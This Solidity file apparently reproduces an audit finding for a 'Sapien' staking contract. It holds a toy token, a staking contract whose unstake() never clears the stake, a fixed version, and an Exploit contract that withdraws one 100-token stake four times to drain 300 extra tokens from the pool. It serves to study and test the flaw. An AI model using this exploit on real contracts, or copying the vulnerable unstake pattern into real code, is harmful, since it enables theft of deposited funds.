// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Sapien staking (Quantstamp, June 2025).
    unstake() pays StakingInfo.amount and never deducts it, and leaves
    isActive set. One 100-token stake can be withdrawn again until the
    contract's other deposits are gone. Lock duration is not checked.
*/

contract SapienToken {
    string public symbol = "SAPIEN";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

struct StakingInfo {
    uint256 amount;
    bool isActive;
}

contract SapienStaking {
    SapienToken public immutable token;
    mapping(uint256 => StakingInfo) public stakes;

    constructor(SapienToken _token) {
        token = _token;
    }

    function stake(uint256 orderId, uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        stakes[orderId] = StakingInfo({amount: amount, isActive: true});
    }

    function unstake(uint256 orderId) external {
        StakingInfo storage info = stakes[orderId];
        require(info.isActive, "inactive");
        uint256 amount = info.amount;
        require(amount > 0, "zero");
        // @> VULN: staked balance is not deducted and isActive stays true
        token.transfer(msg.sender, amount);
    }
}

contract SapienStakingFixed {
    SapienToken public immutable token;
    mapping(uint256 => StakingInfo) public stakes;

    constructor(SapienToken _token) {
        token = _token;
    }

    function stake(uint256 orderId, uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        stakes[orderId] = StakingInfo({amount: amount, isActive: true});
    }

    function unstake(uint256 orderId) external {
        StakingInfo storage info = stakes[orderId];
        require(info.isActive, "inactive");
        uint256 amount = info.amount;
        info.amount = 0;
        info.isActive = false;
        token.transfer(msg.sender, amount);
    }
}

contract Exploit {
    SapienToken public token;
    SapienStaking public staking;
    uint256 public constant STAKE_AMT = 100e18;
    uint256 public constant ORDER = 1;

    constructor() {
        token = new SapienToken();
        staking = new SapienStaking(token);
        token.mint(address(staking), 900e18);
        token.mint(address(this), STAKE_AMT);
    }

    function run() external {
        token.approve(address(staking), STAKE_AMT);
        staking.stake(ORDER, STAKE_AMT);
        uint256 poolAfterStake = token.balanceOf(address(staking));
        require(poolAfterStake == 1_000e18, "pool seeded");
        staking.unstake(ORDER);
        staking.unstake(ORDER);
        staking.unstake(ORDER);
        staking.unstake(ORDER);
        uint256 got = token.balanceOf(address(this));
        require(got == 400e18, "withdrew 400");
        (uint256 still, bool active) = staking.stakes(ORDER);
        require(still == STAKE_AMT && active, "position live");
        uint256 left = token.balanceOf(address(staking));
        require(left == 600e18, "pool left 600");
        require(got - STAKE_AMT == 300e18, "extra 300");
    }
}
